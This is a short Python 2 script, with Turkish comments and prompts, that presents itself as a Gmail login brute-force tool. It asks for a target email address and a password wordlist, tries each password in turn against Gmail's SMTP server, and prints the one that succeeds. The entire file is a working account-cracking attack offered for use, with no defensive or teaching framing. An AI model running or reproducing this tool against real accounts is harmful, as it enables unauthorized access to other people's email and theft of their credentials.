#!/usr/bin/env python
#-*- coding: utf-8 -*-

import smtplib
from datetime import datetime
GHT = '''
========================================
 Yazar: Faruk GÜNGÖR
 Uygulama: Gmail Oturum Açma Girişim (brute-force)
 Tarih: Kasım 2016
=======================================
'''
print " # Gmail Oturum Açma Girişim uygulaması #"
print " # CTRL + C ile programdan çıkabilirsiniz #"
smtpserver=smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()
username=raw_input("hedef e-posta giriniz: ")
password_dosya=raw_input("password dosyasi giriniz :")
password_dosya=open(password_dosya,"r")
baslama_suresi=datetime.now()
for parola in password_dosya:
    try :
      smtpserver.login(username,parola)
      print "şifre bulundu : ", parola
      break;
    except:
      print "oturum açilamadi"
bitis_Suresi=datetime.now()
toplam_sure=bitis_Suresi - baslama_suresi
print "tarama süresi :" , toplam_sure
